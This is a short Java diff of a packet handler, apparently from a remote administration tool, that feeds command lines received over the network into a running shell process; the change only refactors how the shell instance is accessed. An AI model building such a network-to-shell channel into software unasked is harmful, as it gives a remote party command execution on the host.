@@ -16,8 +16,8 @@ public class Packet25RemoteShellExecute extends AbstractIncomingPacket {
 		if (LaunchProcess.latest != null) {
 			PrintWriter input = new PrintWriter(LaunchProcess.latest.p.getOutputStream(), true);
 			input.println(line);
-		} else if (RemoteShell.p != null) {
-			PrintWriter input = new PrintWriter(RemoteShell.p.getOutputStream(), true);
+		} else if (RemoteShell.getInstance() != null) {
+			PrintWriter input = new PrintWriter(RemoteShell.getInstance().getOutputStream(), true);
 			input.println(line);
 		}
 	}
